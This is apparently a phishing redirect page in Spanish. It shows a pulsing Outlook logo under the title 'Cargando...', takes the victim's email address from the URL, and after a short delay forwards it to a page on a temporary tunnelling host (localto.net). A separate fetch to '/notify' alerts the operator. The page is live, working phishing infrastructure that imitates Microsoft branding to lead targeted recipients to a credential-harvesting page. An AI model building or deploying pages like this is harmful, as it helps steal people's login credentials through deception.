<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Cargando...</title>
  <script src="https://code.jquery.com/jquery-3.2.1.js"></script>
  <style>
    body {
      margin: 0;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .loader-img {
      width: 120px;
      height: 120px;
      animation: pulse 1.5s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>

  <script>
    // ✅ 1) Tomar el email de la URL actual
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    // ✅ 2) Redirigir con el email a la URL final
    setTimeout(function() {
      const destino = "https://kyhm4t7pp.localto.net/hrm"; // Tu página final
      if (email) {
        window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
      } else {
        window.location.href = destino; // fallback si no hay email
      }
    }, 1200);
  </script>

  <script>
    fetch('/notify');
  </script>
</head>
<body>
  <img class="loader-img" src="https://it.tamu.edu/microsoft-365/images/logos/Outlook-App-Hover-State.gif" alt="Cargando...">
</body>
</html>
